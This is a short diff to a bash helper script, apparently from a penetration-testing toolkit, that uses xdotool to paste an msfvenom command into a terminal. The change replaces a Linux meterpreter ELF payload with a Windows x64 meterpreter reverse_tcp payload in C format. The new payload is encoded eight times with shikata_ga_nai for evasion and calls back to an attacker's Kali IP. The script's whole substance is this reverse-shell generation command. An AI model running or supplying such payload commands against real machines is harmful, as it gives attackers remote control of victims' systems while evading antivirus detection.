@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-Create ELF file
+Create C file
 '
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
@@ -14,5 +14,5 @@ generate_form "LPORT" "filename"
 LPORT=${form_data["LPORT"]}
 FILE=${form_data["filename"]}
 
-paste_command "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f elf -o ${FILE}.elf"
+paste_command "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -e x86/shikata_ga_nai -i 8 -f c -o ${FILE}.c"
 xdotool key Return
